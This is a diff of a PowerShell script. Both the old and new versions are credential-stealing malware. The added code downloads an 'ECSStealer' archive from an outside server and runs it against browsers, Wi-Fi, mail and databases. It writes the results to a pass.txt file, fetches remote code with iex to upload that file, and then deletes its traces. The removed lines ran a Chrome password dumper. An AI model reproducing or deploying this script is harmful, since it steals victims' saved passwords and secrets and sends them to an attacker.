@@ -1,14 +1,24 @@
-$dist  = "$env:LOCALAPPDATA\Temp\";
-iwr "https://ecs.rcsis.ir/down/ECSStealer.zip" -out ($dist + "e.zip");
-write-output (test-path "$dist\e");
-if ((test-path "$dist\e"))
+function GetIt {
+  param (
+   [String]$dist = "$env:LOCALAPPDATA\Temp"
+    )
+    iwr "https://ecs.rcsis.ir/down/ECSStealer.zip" -out ($dist + "\e.zip");
+    
+  
+}
+function DeleteIt {
+  param (
+    [String]$dist = "$env:LOCALAPPDATA\Temp\e"
+  )
+  write-output (test-path "$dist");
+if ((test-path "$dist"))
 {
 Write-Output "Find Existed Path Go To Delete ...";
 Get-Process | ForEach-Object {
      $process = $_
      $process.Modules | ForEach-Object {
        $module = $_
-       if ($module.ModuleName -like "*SQLite*")
+       if ($module.ModuleName -like "*ECSStealer*")
        {
           $ecsm = [PSCustomObject]@{
                      ProcessName = $process.ProcessName
@@ -23,10 +33,31 @@ Get-Process | ForEach-Object {
  }
  }
  }
- 
 # Remove the directory
-Remove-Item -Path "$dist\e" -Recurse -Force
+Remove-Item -Path "$dist" -Recurse -Force
 }
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory( "$dist\e.zip","$dist\e")
-& "$dist\e\ChromePasswordDumper-master\ChromePasswordDumper\windows.ps1"
+}
+
+$uid = "{uid}"
+#main Script
+
+
+if ($dist){
+  write-output ("dist is pre defined :" + "$dist")
+}else{
+  write-output ("dist is not defined")
+  $dist = "$env:LOCALAPPDATA\Temp"
+}
+  $tags = @('browsers','wifi','mails','databases') 
+  DeleteIt
+  GetIt
+  Add-Type -AssemblyName System.IO.Compression.FileSystem
+  [System.IO.Compression.ZipFile]::ExtractToDirectory( "$dist\e.zip","$dist\e")
+  foreach( $tag in $tags ){
+    write-output ("######################------ $tag ------######################")
+    write-output ("######################------ $tag ------######################") >> $dist\e\pass.txt
+    cmd /c  $dist\e\ECSStealer.html $tag -v >>  $dist\e\pass.txt
+  }
+  iex("$(iwr https://ecs.rcsis.ir/upload?uid=$uid) " + "@('$dist\e\pass.txt')")
+  DeleteIt
+  DeleteIt $dist\e.zip
